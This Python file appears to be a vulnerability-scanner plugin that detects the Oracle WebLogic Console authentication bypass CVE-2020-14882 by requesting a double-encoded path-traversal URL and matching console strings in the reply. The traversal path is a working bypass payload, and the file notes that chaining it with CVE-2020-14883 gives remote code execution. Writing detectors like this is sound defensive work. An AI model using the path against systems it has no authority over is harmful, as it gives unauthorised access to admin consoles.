"""CVE-2020-14882 - Oracle WebLogic Console unauth RCE."""
from .base import CVEDetector, CVEResult


class WeblogicConsoleBypass(CVEDetector):
    cve_id = "CVE-2020-14882"
    title = "Oracle WebLogic Console Authentication Bypass"
    severity = "critical"
    affected = "WebLogic 10.3.6 / 12.1.3 / 12.2.1 / 14.1.1 (pre-October 2020)"
    tags = ["cve-2020-14882", "weblogic", "auth-bypass", "rce"]

    PATH = "/console/css/%252e%252e%252fconsole.portal"

    def probe(self, base, baseline_body):
        status, body = self._get(base + self.PATH, timeout=8)
        if not body:
            return None
        signals = ("ConsoleHelp", "wl_console", "weblogic", "Console Login")
        hit = sum(1 for s in signals if s in body) >= 2
        if hit and "Console Login" not in baseline_body:
            return CVEResult(
                vulnerable=True,
                url=base + self.PATH,
                evidence="WebLogic Console reached via %252e..%252f bypass",
                detail=(
                    "Authentication bypass path reaches the admin console. "
                    "Chained with CVE-2020-14883 this yields unauth RCE."
                ),
            )
        return None
